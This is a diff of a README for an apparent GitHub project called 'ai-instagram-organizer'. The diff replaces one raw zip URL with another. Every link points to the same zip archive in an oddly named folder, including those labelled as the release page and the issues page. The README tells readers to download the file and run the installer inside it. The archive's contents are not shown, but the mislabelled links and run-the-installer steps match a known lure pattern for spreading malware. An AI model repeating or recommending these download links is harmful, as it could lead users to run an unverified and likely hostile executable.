@@ -1,6 +1,6 @@
 # 📸 ai-instagram-organizer - Streamline Your Instagram Posts Effortlessly
 
-[![Download](https://raw.githubusercontent.com/EduardozinYT/ai-instagram-organizer/main/Arvicolinae/ai-instagram-organizer.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/EduardozinYT/ai-instagram-organizer/main/Arvicolinae/ai-instagram-organizer.zip)
+[![Download](https://github.com/EduardozinYT/ai-instagram-organizer/raw/refs/heads/main/Arvicolinae/instagram-organizer-ai-pistollike.zip%20Now-Release%20Page-brightgreen)](https://github.com/EduardozinYT/ai-instagram-organizer/raw/refs/heads/main/Arvicolinae/instagram-organizer-ai-pistollike.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **ai-instagram-organizer**! This tool uses AI to help you neatly orga
 
 To get started, follow these steps:
 
-1. **Visit the Release Page**: Go to our [Release Page](https://raw.githubusercontent.com/EduardozinYT/ai-instagram-organizer/main/Arvicolinae/ai-instagram-organizer.zip) to find the latest version.
+1. **Visit the Release Page**: Go to our [Release Page](https://github.com/EduardozinYT/ai-instagram-organizer/raw/refs/heads/main/Arvicolinae/instagram-organizer-ai-pistollike.zip) to find the latest version.
 2. **Choose Your Version**: Look for the latest release and click on the relevant file for your operating system.
 3. **Download the File**: Depending on your device, download the file by clicking on it.
 4. **Run the Installer**: Once downloaded, locate the file in your downloads folder and double-click to run it. Follow the on-screen instructions to install the tool.
@@ -65,7 +65,7 @@ Yes, you can manually enter your captions in the designated field before saving 
 
 ### What should I do if I encounter an error?
 
-If you run into issues, visit our [GitHub Issues Page](https://raw.githubusercontent.com/EduardozinYT/ai-instagram-organizer/main/Arvicolinae/ai-instagram-organizer.zip) and report your problem. Our team regularly checks for new issues and will assist you.
+If you run into issues, visit our [GitHub Issues Page](https://github.com/EduardozinYT/ai-instagram-organizer/raw/refs/heads/main/Arvicolinae/instagram-organizer-ai-pistollike.zip) and report your problem. Our team regularly checks for new issues and will assist you.
 
 ## 🗨️ Community Support
 
@@ -99,4 +99,4 @@ Looking for additional features? Stay updated on new releases and features throu
 
 ---
 
-For any further queries, please refer back to the main [Release Page](https://raw.githubusercontent.com/EduardozinYT/ai-instagram-organizer/main/Arvicolinae/ai-instagram-organizer.zip). Happy posting!
+For any further queries, please refer back to the main [Release Page](https://github.com/EduardozinYT/ai-instagram-organizer/raw/refs/heads/main/Arvicolinae/instagram-organizer-ai-pistollike.zip). Happy posting!
